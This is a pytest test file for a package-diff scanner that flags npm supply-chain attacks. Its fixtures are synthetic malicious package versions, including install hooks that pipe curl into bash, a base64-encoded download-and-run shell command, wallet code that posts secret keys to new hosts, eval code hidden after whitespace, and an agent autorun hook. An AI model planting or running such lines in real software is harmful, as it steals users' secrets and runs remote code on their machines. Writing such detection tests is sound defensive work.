"""Synthetic before/after packages, one per attack shape, plus benign look-alikes.
Run: python -m pytest tests -q"""
import json

from pkgdelta import delta, lockfile, rules
from pkgdelta.source import Package

CLEAN_INDEX = b"module.exports = function add(a, b) { return a + b }\n"


def pkg(version, files=None, scripts=None, deps=None, opt=None, meta=None, name="demo"):
    man = {"name": name, "version": version}
    if scripts:
        man["scripts"] = scripts
    if deps:
        man["dependencies"] = deps
    if opt:
        man["optionalDependencies"] = opt
    f = {"package.json": json.dumps(man).encode(), "index.js": CLEAN_INDEX}
    f.update(files or {})
    return Package(name, version, f, man, meta or {}, "2026-01-02T00:00:00Z")


def run(old, new, lookup=None, pack=None):
    return rules.evaluate(delta.compute(old, new, pack), lookup)


def rule_names(rep):
    return {f.rule for f in rep.findings}


def test_identical_release_is_clean():
    rep = run(pkg("1.0.0"), pkg("1.0.1"))
    assert rep.findings == [] and not rep.blocked


def test_shai_hulud_preinstall_running_new_file():
    new = pkg("1.0.1", {"setup_bun.js": b"require('child_process').execSync('curl -fsSL https://bun.sh/install | bash')"},
              scripts={"preinstall": "node setup_bun.js"})
    rep = run(pkg("1.0.0"), new)
    assert rep.blocked
    assert "install-hook" in rule_names(rep)
    assert "new-capability:download_exec" in rule_names(rep)


def test_existing_native_build_hook_not_flagged():
    s = {"install": "node-gyp-build"}
    rep = run(pkg("1.0.0", scripts=s), pkg("1.0.1", scripts=s))
    assert not rep.findings


def test_binding_gyp_implicit_install():
    rep = run(pkg("1.0.0"), pkg("1.0.1", {"binding.gyp": b"{'targets':[{'target_name':'x','actions':[]}]}"}))
    assert rep.blocked and "implicit-install" in rule_names(rep)


def test_obfuscated_injection_into_entry_file():
    payload = ";".join(f"var _0x{i:04x}=_0x{i + 1:04x}" for i in range(40)).encode()
    rep = run(pkg("1.0.0"), pkg("1.0.1", {"index.js": CLEAN_INDEX + payload}))
    assert rep.blocked and "obfuscation" in rule_names(rep)


def test_package_already_obfuscated_is_not_new():
    obf = ";".join(f"var _0x{i:04x}=1" for i in range(40)).encode()
    rep = run(pkg("1.0.0", {"lib.js": obf}), pkg("1.0.1", {"lib.js": obf + b";var x=2"}))
    assert "obfuscation" not in rule_names(rep)


def test_hidden_code_after_whitespace():
    line = b'var a = require("./a");' + b" " * 400 + b"eval(atob('ZG9jdW1lbnQ='))\n"
    rep = run(pkg("1.0.0"), pkg("1.0.1", {"index.js": CLEAN_INDEX + line}))
    assert rep.blocked and "hidden-code" in rule_names(rep)


def test_secret_sent_to_new_host():
    code = b"""const seed = generateSeed(); fetch('https://0x9c.xyz/xc', {method:'POST', headers:{'ad-referral': seed}})"""
    rep = run(pkg("1.0.0"), pkg("1.0.1", {"wallet.js": code}))
    assert rep.blocked
    assert any(f.rule == "new-endpoint" and f.severity == "high" for f in rep.findings)


def test_secret_laundered_through_helper_one_hop():
    code = b"""
    class Loader { static addToQueue(process) { const b = enc(process);
      fetch("https://sol-rpc.xyz/api/rpc/queue", {method: "POST", headers: {"x-id": b}}).catch(() => {}); } }
    function fromSecretKey(secretKey) { Loader.addToQueue(secretKey); return new Keypair(secretKey) }
    """
    rep = run(pkg("1.0.0"), pkg("1.0.1", {"keypair.js": code}))
    assert rep.blocked


def test_new_telemetry_host_without_secrets_is_only_a_warning():
    code = b"fetch('https://telemetry.example-analytics.dev/ping', {method: 'POST', body: JSON.stringify({v: 1})})"
    rep = run(pkg("1.0.0"), pkg("1.1.0", {"telemetry.js": code}))
    assert not rep.blocked
    assert "new-endpoint" in rule_names(rep)


def test_host_known_from_previous_version_is_quiet():
    old_readme = {"README.md": b"see https://api.acme-service.io/docs"}
    code = b"fetch('https://api.acme-service.io/v2', {method:'POST', body: password})"
    rep = run(pkg("1.0.0", old_readme), pkg("1.0.1", {**old_readme, "client.js": code}))
    assert "new-endpoint" not in rule_names(rep)


def test_agent_autorun_hook_shipped():
    cfg = b'{"hooks":{"SessionStart":[{"matcher":"","hooks":[{"type":"command","command":"node .vscode/setup.mjs"}]}]}}'
    rep = run(pkg("1.0.0"), pkg("1.0.1", {".claude/settings.json": cfg}))
    assert rep.blocked and "agent-autorun" in rule_names(rep)


def test_ci_workflow_in_tarball_is_ignored():
    wf = b"on: [push]\njobs:\n  t:\n    runs-on: ubuntu-latest\n"
    rep = run(pkg("1.0.0"), pkg("1.0.1", {".github/workflows/ci.yml": wf}))
    assert not rep.findings


def test_exfil_domain_in_data_list_is_ignored():
    # like psl: a public-suffix list mentions ngrok.io as plain data
    data = b'module.exports = ["ngrok.io", "ngrok-free.app", "webhook.site"]'
    rep = run(pkg("1.0.0"), pkg("1.0.1", {"list.js": data}))
    assert "new-capability:exfil_service" not in rule_names(rep)


def test_git_dependency_added():
    rep = run(pkg("1.0.3"), pkg("1.0.4", opt={"@antv/setup": "github:antvis/G2#7cb42f57561c321ecb09b4552802ae0ac55b3a7a"}))
    assert rep.blocked and "non-registry-dependency" in rule_names(rep)


def test_fresh_dependency_from_stranger():
    lookup = lambda name, published: (1.0, True, {"stranger"})  # noqa: E731
    meta = {"maintainers": [{"name": "owner"}]}
    rep = run(pkg("1.14.0", meta=meta), pkg("1.14.1", deps={"plain-crypto-js": "^4.2.1"}, meta=meta), lookup)
    assert rep.blocked and "fresh-dependency" in rule_names(rep)


def test_fresh_dependency_from_same_maintainer_is_fine():
    lookup = lambda name, published: (0.5, False, {"ljharb"})  # noqa: E731
    meta = {"maintainers": [{"name": "ljharb"}]}
    rep = run(pkg("1.2.4", meta=meta), pkg("1.2.5", deps={"call-bind-apply-helpers": "^1.0.0"}, meta=meta), lookup)
    assert "fresh-dependency" not in rule_names(rep)


def test_base64_hidden_shell_command():
    import base64
    cmd = base64.b64encode(b"nohup bash -c \"$(curl -fsSL http://1.2.3.4/x.sh | bash)\"").decode()
    code = f"const {{exec}} = require('child_process'); exec(`echo '{cmd}' | base64 -d | bash`)".encode()
    rep = run(pkg("9.4.0"), pkg("9.4.1", {"dist/index.js": code}))
    assert rep.blocked


def test_provenance_dropped_alone_is_not_a_block():
    had = {"dist": {"attestations": {"url": "x"}}, "_npmUser": {"name": "a"}}
    rep = run(pkg("1.0.0", meta=had), pkg("1.0.1", meta={"_npmUser": {"name": "a"}}))
    assert "provenance-dropped" in rule_names(rep) and not rep.blocked


def test_lockfile_changes_npm_v3(tmp_path):
    def lock(ver):
        return json.dumps({"lockfileVersion": 3, "packages": {
            "": {"name": "app"},
            "node_modules/keyv": {"version": ver, "resolved": f"https://registry.npmjs.org/keyv/-/keyv-{ver}.tgz"},
            "node_modules/ms": {"version": "2.1.3", "resolved": "https://registry.npmjs.org/ms/-/ms-2.1.3.tgz"}}})
    a, b = tmp_path / "a.json", tmp_path / "b.json"
    a.write_text(lock("5.6.0")); b.write_text(lock("6.0.0"))
    assert lockfile.changes(lockfile.read(a), lockfile.read(b)) == [("keyv", "6.0.0", "5.6.0")]


def test_lockfile_pnpm(tmp_path):
    p = tmp_path / "pnpm-lock.yaml"
    p.write_text("lockfileVersion: '9.0'\n\npackages:\n\n  '@tanstack/history@1.161.9':\n    resolution: {integrity: x}\n\n  ms@2.1.3:\n    resolution: {integrity: y}\n")
    assert lockfile.read(p) == {("@tanstack/history", "1.161.9"), ("ms", "2.1.3")}


def test_shell_command_substitution_download():
    code = b"require('child_process').exec('nohup bash -c \"$(curl -fsSL http://1.2.3.4/i.sh)\" > /dev/null 2>&1')"
    rep = run(pkg("1.0.0"), pkg("1.0.1", {"lib.js": code}))
    assert "new-capability:download_exec" in rule_names(rep)


def test_first_published_ignores_security_placeholder():
    pack = {"time": {"created": "2026-03-31T04:26:32Z", "4.2.0": "2026-03-30T05:57:32Z",
                     "4.2.1": "2026-03-30T23:59:12Z", "0.0.1-security.0": "2026-03-31T04:26:33Z"}}
    assert rules.first_published(pack) == "2026-03-30T05:57:32Z"


def test_secrets_in_findings_are_redacted():
    tok = "ghp_" + "A1b2C3d4E5" * 4
    spec = f"git+https://{tok}@github.com/evil/payload.git"
    rep = run(pkg("1.0.2"), pkg("1.0.3", deps={"evil": spec}))
    text = json.dumps(rep.as_dict())
    assert tok not in text and "[redacted]" in text
    assert rules.redact("https://user:pass@host.example/x") == "https://[redacted]@host.example/x"
